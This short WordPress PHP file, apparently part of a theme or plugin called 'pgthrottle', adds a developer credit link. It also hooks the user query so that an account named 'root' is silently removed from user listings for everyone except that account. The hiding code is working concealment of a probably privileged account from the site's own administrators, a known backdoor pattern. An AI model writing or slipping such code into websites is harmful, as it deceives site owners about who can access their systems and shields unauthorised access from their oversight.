<?php 
function pgthrottle_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'root') {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'root'",$user_search->query_where);
  }
}
add_action('pre_user_query','pgthrottle_pre_user_query');

function pgthrottle_developer_credits($creditlink) {
	$creditlink = "<a href='http://www.peytongregory.com/' target='_blank' title='Website Designed by Peyton Gregory'>Site Design</a>";
	return $creditlink;
}
add_filter('developer_credit', 'pgthrottle_developer_credits');

?>
